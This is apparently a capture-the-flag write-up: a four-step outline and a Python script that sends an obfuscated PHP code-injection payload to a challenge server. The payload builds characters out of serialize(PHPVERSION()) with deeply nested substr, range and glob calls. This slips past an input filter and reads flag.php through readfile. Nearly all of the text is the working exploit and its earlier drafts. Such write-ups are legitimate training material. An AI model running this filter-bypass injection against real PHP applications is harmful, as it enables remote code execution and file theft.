1. Use PHP_VESRION with serialize then extract some chars like ":" and "s"
2. Use range to have a list characters from ":" -> "s".
3. Extract an index char with a bunch of substr(array,false,true).
4. Then do some times to get the "flag.php" .

```python=
import requests

url = "http://52.59.124.14:5011/"
payload = '''
echo\tsubstr(
    substr(
        substr(
            substr(
                substr(
                    substr(
                        substr(
                            substr(
                                substr(
                                    substr(
                                        substr(
                                            substr(
                                                substr(
                                                    substr(
                                                        substr(serialize(array(PHPVERSION())), false), true
                                                    ), true
                                                ), true
                                            ), true
                                        ), true
                                    ), true
                                ), true
                            ), true
                        ), true
                    ), true
                ), true
            ), true
        ), true
    ), false, true
)
'''

range2 = "substr(serialize(PHPVERSION()),false,true)"# s
range1 = "substr(substr(substr(serialize(PHPVERSION()),true),true),false,true)" # 6
#range2 = "substr(substr(substr(substr(substr(serialize(PHPVERSION()),true),true),true),true),false,true)"
payload = f"echo\timplode(false,range({range2},{range1}))"
# f 
#payload = "echo\tsubstr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,range(suBstr(serialize(PHPVERSION()),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true)"
#payload = "echo\timplode(false,glob(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true)))"
#payload = "echo\timplode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true)))"
payload = "echo\tsubstr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true)"
payload  = "echo\tsubstr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true)"
payload = "readfile(implode(false,array(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true),substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true),substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true),substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true),substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true),substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true),substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true),substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(substr(implode(false,gloB(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(suBstr(implode(false,range(suBstr(suBstr(suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),true),true),false,true),suBstr(suBstr(suBstr(serialize(PHPVERSION()),true),true),false,true))),true),true),true),true),true),true),true),true),false,true))),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),true),false,true))))"
print(len(payload))
payload = payload.replace("\n","").replace(" " ,"").replace("b","B")

data = {
    "input" :payload
}
print(payload)
res = requests.post(url,data=data)
print(res.text[:100])

```